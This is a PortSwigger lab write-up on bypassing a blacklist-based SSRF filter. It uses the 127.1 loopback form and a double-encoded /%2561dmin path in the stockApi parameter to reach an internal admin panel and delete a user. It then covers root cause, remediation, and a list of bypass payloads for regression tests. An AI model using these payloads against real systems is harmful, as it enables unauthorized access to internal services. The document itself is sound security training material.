# PortSwigger Lab 03 - SSRF With Blacklist-Based Input Filter

## Lab

PortSwigger Web Security Academy:

```text
SSRF with blacklist-based input filter
```

## What I Tested

I tested a stock check feature that accepted a `stockApi` parameter.

The normal request returned a stock number:

```http
POST /product/stock
Content-Type: application/x-www-form-urlencoded

stockApi=http://stock.weliketoshop.net:8080/product/stock/check?productId=1&storeId=1
```

This confirmed the normal backend stock-checking behaviour.

## What I Found

When I tried to use localhost, the application blocked the request:

```text
http://localhost/admin
```

The response showed:

```text
External stock check blocked for security reasons
```

The same happened for:

```text
http://127.0.0.1/
```

This showed that the application had an SSRF filter.

Further testing suggested that the filter blocked both:

```text
localhost / 127.0.0.1
```

and the sensitive path:

```text
/admin
```

## Filter Mapping

Initial tests:

```text
http://localhost/admin                    -> blocked
http://127.0.0.1/                         -> blocked
http://localhost/test                     -> blocked
http://stock.weliketoshop.net:8080/admin  -> blocked
```

This suggested that the filter was blacklist-based.

It appeared to block known bad strings instead of validating the final network destination safely.

## Bypass 1 - Alternative Loopback Notation

Using:

```text
http://127.1/
```

returned the application page instead of the block message.

This showed that `127.1` could reach loopback while bypassing a weak filter that blocked only literal values such as:

```text
localhost
127.0.0.1
```

## Bypass 2 - Double Encoding the Path

The filter also blocked the literal path:

```text
/admin
```

The bypass was to double-encode the first letter of `admin`:

```text
/%2561dmin
```

Decode flow:

```text
%2561 -> %61 -> a
```

Final interpreted path:

```text
/admin
```

This allowed access to the admin panel through the vulnerable `stockApi` parameter.

## Final Action

After confirming access to the admin panel, the same pattern was used against the delete endpoint for `carlos`:

```text
http://127.1/%2561dmin/delete?username=carlos
```

The backend returned a redirect to `/admin`, indicating that the internal action was triggered.

## Why It Matters

This lab showed why blacklist-based SSRF protection is weak.

The application tried to block dangerous destinations by matching specific strings, but equivalent representations bypassed the filter.

The real issue was not the exact string used. The issue was that the backend could still be made to request a dangerous internal destination.

## Root Cause

The root cause was:

- user-controlled backend request destination,
- blacklist-based filtering,
- incomplete blocking of loopback representations,
- incomplete blocking of encoded sensitive paths,
- validation happening before final decoding/normalisation,
- no robust validation of the final resolved destination.

## Impact

Possible impact:

- bypassing SSRF filters,
- accessing internal admin panels,
- triggering unauthorized state-changing actions,
- defeating protections based on simple string matching,
- reaching localhost/internal services despite attempted filtering.

## AppSec Principle Violated

The application tried to protect a dangerous feature using fragile input filtering.

A strong SSRF defence should validate where the backend actually connects after:

```text
URL parsing
decoding
normalisation
DNS resolution
redirect handling
```

## Remediation

Safer implementation should:

- avoid arbitrary user-controlled backend URLs,
- use strict allowlists for expected stock API destinations,
- validate the final resolved IP address,
- block all loopback/private/link-local/metadata ranges,
- validate after decoding and normalisation,
- validate every redirect hop,
- restrict ports and schemes,
- avoid relying on string blacklists,
- require real authentication and authorization on admin functionality.

## Regression Test Idea

Add tests for blacklist bypass patterns:

```text
http://localhost/admin
http://127.0.0.1/admin
http://127.1/admin
http://127.1/%61dmin
http://127.1/%2561dmin
http://2130706433/admin
http://017700000001/admin
```

Expected result:

```text
All requests resolving to loopback or internal destinations should be blocked, regardless of representation or encoding.
```

## Developer Takeaway

Do not ask:

```text
Does the input contain "localhost" or "admin"?
```

Ask:

```text
Where will the backend actually connect after parsing, decoding, DNS resolution and redirects?
```

Blacklist checks are easy to bypass because they usually look at strings, not the final destination.
